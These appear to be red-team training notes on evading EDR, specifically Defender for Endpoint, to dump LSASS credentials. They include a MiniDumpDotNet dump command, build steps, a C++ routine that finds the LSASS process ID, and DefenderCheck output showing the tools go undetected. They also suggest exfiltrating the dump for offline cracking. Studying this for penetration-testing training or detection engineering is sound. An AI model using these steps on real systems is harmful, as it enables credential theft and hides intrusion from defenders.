
Endpoint Detection and Response (EDR) systems protect individual devices (endpoints) by continuously monitoring for and responding to security threats.

- EDR includes features for **threat detection**, **incident response**, **investigation**, and **forensics**, making it a vital component of modern cybersecurity strategies.
- Most EDRs **correlate activity** to gain broader telemetry and improve detections.
- Even if all performed activity is undetected by traditional antivirus (AV), EDRs can still correlate those actions to identify **attacker tactics, techniques, and procedures (TTPs)**.
### LSASS Dump
While performing LSASS credential dumping, direct interaction/extraction of data from the LSASS process (Ex: Mimikatz `sekurlsa::logonpasswords`) is detected by MDE

**A more OPSEC friendly way is by performing a dump of the LSASS process in a covert way and then exfiltrating it to later analyze offline.** However, standard techniques to create LSASS dumps (Ex: `taskmanager` → create dump file) are detected and blocked.


Most tools create an LSASS dump by:

1. Gaining a handle to the **LSASS process**.  
2. Creating a minidump using the `MiniDumpWriteDump` WinAPI function implemented in **dbghelp.dll** / **dbgcore.dll**.  
3. Writing the **dump file** to disk.

- These 3 actions are heavily **monitored by EDRs** and are usually **detected and blocked**.
- To circumvent these detections, we can avoid using tools that implement the `MiniDumpWriteDump` function and perform the LSASS dump in a **different way**.

### MiniDumpDotNet

[MiniDumpDotNet](https://github.com/WhiteOakSecurity/MiniDumpDotNet) is a tool that implements a **custom, rewritten version** of the `MiniDumpWriteDump` Windows API function.

- In this tool, the `MiniDumpWriteDump` function is **reversed**, and a **custom implementation** is created based on a **Beacon Object File (BOF) adaptation** and the **ReactOS source code**.

Dump the LSASS process with minidumpdotnet using the following syntax. Note that
we need Process ID of LSASS process:
```powershell
.\minidumpdotnet.exe <LSASS PID> <minidump file>
```

##### Building minidumpdotnet

- Clone/Download the project:
  ```bash
  git clone https://github.com/WhiteOakSecurity/MiniDumpDotNet.git
  ```

> **Note**: This project was implemented with Visual Studio 2015, but should be supported by any Visual Studio compiler that can build VS C++ CLR code.

- **Building the solution will generate both a binary executable, as well as a .NET class library.**

- **Build the project:** *Build -> Build Solution*

Check if it triggers alerts
```powershell
C:\AD\Tools\DefenderCheck> .\DefenderCheck.exe C:\AD\Tools\minidumpdotnet.exe
[+] No threat found in submitted file!
```

#### Finding LSASS PID using Custom APIs
- Using commands like `tasklist /v` to enumerate the LSASS PID is detected by MDE.
- To avoid this, we can make use of standard WINAPIs to find the LSASS PID, which is OPSEC-safe.
- In case of RDP access, tools like Task Manager (or other less suspicious alternatives) could also be used for finding the LSASS PID.

Code snippet of a custom function called `FindPID` in C++ to dynamically enumerate the LSASS PID:

  ```cpp
  // Find PID of a process by name
  int FindPID(const char* procname)
  {
      int pid = 0;
      PROCESSENTRY32 proc = {};
      proc.dwSize = sizeof(PROCESSENTRY32);
      HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
      bool bProc = Process32First(snapshot, &proc);
      while (bProc)
      {
          if (strcmp(procname, proc.szExeFile) == 0)
          {
              pid = proc.th32ProcessID;
              break;
          }
          bProc = Process32Next(snapshot, &proc);
      }
      return pid;
  }
  ```

Using the FindPID code in a standalone executable is not detected by Defender AV
or MDE
```powershell
C:\AD\Tools\DefenderCheck> .\DefenderCheck.exe C:\AD\Tools\FindLSASSPID.exe
[+] No threat found in submitted file!
```